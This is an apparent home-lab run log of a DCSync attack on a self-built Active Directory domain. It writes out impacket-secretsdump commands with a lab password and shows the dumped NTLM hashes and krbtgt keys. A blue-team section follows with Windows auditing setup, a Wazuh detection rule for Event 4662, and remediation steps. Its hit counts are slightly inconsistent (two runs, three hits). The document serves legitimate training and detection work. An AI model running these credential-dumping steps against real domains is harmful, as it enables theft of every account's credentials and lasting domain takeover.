# Project 03 — DCSync: Run Log

Actual execution record of the attack described in [`README.md`](README.md).
Run on **2026-07-30 / 31** from KALI01 (`10.10.10.40`) against DC01 (`10.10.10.10`).
Structured along the **PTES** phases and mapped to **MITRE ATT&CK** technique IDs —
every action carries its ATT&CK ID.

---

## Environment at run time
- **KALI01** — Kali 2026.2, `felix@felix`, eth1 = host-only `10.10.10.40/24`, DNS → DC01.
- **DC01** — `lab.local` DC, `10.10.10.10`, NTDS running.
- **Credential in hand:** `b.otieno : Password1` — recovered in Project 02 (AS-REP
  roasting). In this lab `b.otieno` is a Tier-2 helpdesk account that was wrongly
  granted the domain replication rights (misconfig #3) **and** left in Domain Admins
  (misconfig #4).
- Tooling shipped with Kali: `impacket-secretsdump`.

## PTES phase mapping (what maps to what)

| PTES phase | ATT&CK tactic | Action in this project | ATT&CK ID |
|------------|---------------|------------------------|-----------|
| Pre-engagement / scope | — | Authorised, isolated `10.10.10.0/24` lab I built to be vulnerable | — |
| Intelligence Gathering | Discovery | Confirm reachability of the DC (ping/DNS) before replicating | T1018 (Remote System Discovery) |
| (creds already held) | Credential Access | `b.otieno` password obtained in Project 02 | T1558.004 (AS-REP Roasting) |
| Exploitation | Credential Access | **DCSync** — impersonate a DC over DRSUAPI and replicate NTDS secrets | **T1003.006** (OS Credential Dumping: DCSync) |
| Post-Exploitation | — | krbtgt hash pulled → enables Golden Ticket forging (persistence) | T1558.001 (Golden Ticket) — *enabled, not performed* |
| Reporting / detection | — | Blue-phase detection of the 4662 replication event in Wazuh | — |

## Step 1 — Intelligence Gathering: confirm reach to the DC (T1018)

```bash
ping -c 3 10.10.10.10
# 3 packets transmitted, 3 received, 0% packet loss
```
Kali on `10.10.10.40` reaches DC01 over the host-only lab net.
Evidence: [`evidence/01-kali-reaches-dc.png`](evidence/01-kali-reaches-dc.png).

## Step 2 — Exploitation: DCSync the whole domain (T1003.006)

`secretsdump` uses the **DRSUAPI** method: it asks the DC to *replicate* account
secrets, exactly as a second DC would. Only the two replication extended rights are
needed, and `b.otieno` holds them:

```bash
impacket-secretsdump 'lab.local/b.otieno:Password1@10.10.10.10' -just-dc-ntlm \
    -outputfile dcsync_dump
```

Output ([`evidence/secretsdump_output.txt`](evidence/secretsdump_output.txt)) — NTLM
hashes for **every** account in the domain, including `Administrator:500` and
`krbtgt:502`, all domain users, `svc_sql`, and the machine accounts `DC01$`/`WS01$`:

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b18a7c41c5fbea768fbf3107ab934e1c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4134aaae28ceb682a08edb0b5b189278:::
lab.local\svc_sql:1121:...:e19ccf75ee54e06b06a5907af13cef42:::
DC01$:1000:...  WS01$:1122:...
```
Evidence (full-screen terminal): [`evidence/02-dcsync-full-domain-dump.png`](evidence/02-dcsync-full-domain-dump.png).

## Step 3 — Post-Exploitation: isolate the crown jewel, krbtgt (enables T1558.001)

```bash
impacket-secretsdump 'lab.local/b.otieno:Password1@10.10.10.10' -just-dc-user krbtgt
```
```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4134aaae28ceb682a08edb0b5b189278:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:0e8ec2dcdbbed1ca9343b73a0de3616f9468bc2bd2d0496c28cae2cec50d50d2
```
The `krbtgt` NT hash is the key material for forging a **Golden Ticket**
(**T1558.001**) — a self-issued TGT for any user, valid until krbtgt is rotated
twice. I stop at recovering the key (I don't forge a ticket), but recovering it is the
whole point: DCSync → krbtgt → effectively permanent domain compromise.
Evidence: [`evidence/03-dcsync-krbtgt-golden-key.png`](evidence/03-dcsync-krbtgt-golden-key.png).

## Result

From a **helpdesk-tier** account I replicated **every credential in the domain**,
including `krbtgt` and the built-in Administrator — no exploit, no malware, just a
misused ACL. `b.otieno` being over-permissioned turns "reset a user's password" into
"own the forest."

## Blue phase — detection fired (2026-07-31)

**Auditing prerequisite (real-world note):** DCSync's Event **4662** only appears if
the DC audits *Directory Service Access* **and** the domain object has a SACL auditing
the replication rights. Windows does **not** do this by default, so I enabled it on
DC01 as a defender would:
```powershell
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
# + a SACL on the domain root auditing the two replication GUIDs for Everyone
```

With that in place I re-ran the DCSync (all three VMs live: DC01 + KALI01 + WAZUH01),
DC01's agent shipped the 4662, and custom rule **100012** matched. Filtering
`rule.id:100012` in Wazuh returns the hits (I ran it twice, so `firedtimes` = 2) with:

| Field | Value |
|-------|-------|
| rule.id / level | **100012** / 12 |
| rule.description | DCSync: directory replication rights exercised (possible domain hash dump) [T1003.006] |
| rule.mitre | **T1003.006** (Credential Access → DCSync) |
| agent.name | **DC01** (id 001) |
| data.win.system.eventID | **4662** |
| data.win.eventdata.subjectUserName | **b.otieno** (the over-permissioned helpdesk account) |
| Properties (in message) | **`{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}`** — DS-Replication-Get-Changes-All, the DCSync signature |
| accesses | Control Access on an object of type `DS` |

The full alert document is saved at
[`evidence/wazuh_alert_100012.json`](evidence/wazuh_alert_100012.json). That closes the
loop on misconfig #3: the **same finding** is both exploited (red) and detected (blue).

> **Screenshot note:** the dashboard was driven from Firefox inside the KALI01 GNOME
> (Wayland) session, entirely by keyboard (GNOME's Wayland RemoteDesktop portal blocks
> synthetic *mouse* clicks). The trick that makes Discover render the rows without a
> click: set `wazuh-alerts-*` as the **default index pattern** server-side
> (`POST /api/opensearch-dashboards/settings/defaultIndex`), then open the **classic**
> `/app/discover#/?_a=(...index:'wazuh-alerts'...)` route — the classic app binds the
> default index, so the datasource shows `wazuh-alerts-*` and the hits render (04).
> The raw alert JSON is kept too as the full field-level detail.

## Remediation (verified understanding)
- **Strip replication rights** from anything that isn't a DC or a sanctioned sync
  service; audit the domain-root ACL for `Get-Changes*` grants on a schedule.
- Enforce **Tiered Administration** so a helpdesk account can never hold domain rights.
- **Alert on 4662 replication from non-DC principals** (rule 100012).
- Because `krbtgt` was exposed, **rotate the krbtgt password twice**.

## Evidence

**Red phase** — full-screen KALI01 GUI terminal (2026-07-30):

| # | Shot | What it shows |
|---|------|---------------|
| 1 | [`evidence/01-kali-reaches-dc.png`](evidence/01-kali-reaches-dc.png) | Kali on `10.10.10.40` reaching DC01 (ping, 0% loss) — T1018 |
| 2 | [`evidence/02-dcsync-full-domain-dump.png`](evidence/02-dcsync-full-domain-dump.png) | `secretsdump -just-dc-ntlm` replicating **every** domain hash incl. Administrator & krbtgt — T1003.006 |
| 3 | [`evidence/03-dcsync-krbtgt-golden-key.png`](evidence/03-dcsync-krbtgt-golden-key.png) | Targeted `krbtgt` pull + Kerberos keys — the Golden Ticket key (enables T1558.001) |

**Blue phase** — Wazuh dashboard + alert data (2026-07-31):

| # | Shot / file | What it shows |
|---|-------------|---------------|
| 4 | [`evidence/04-wazuh-dcsync-alert.png`](evidence/04-wazuh-dcsync-alert.png) | Wazuh Discover filtered to `rule.id:100012` — **3 hits** rendered, `_source` rows showing 4662 / replication GUID / subject `b.otieno` / agent DC01 |
| — | [`evidence/wazuh_alert_100012.json`](evidence/wazuh_alert_100012.json) | Full alert: 4662 / replication GUID `1131f6ad…` / subject `b.otieno` / T1003.006 |

Raw command output:
- [`evidence/secretsdump_output.txt`](evidence/secretsdump_output.txt) — the domain hash dump + krbtgt pull
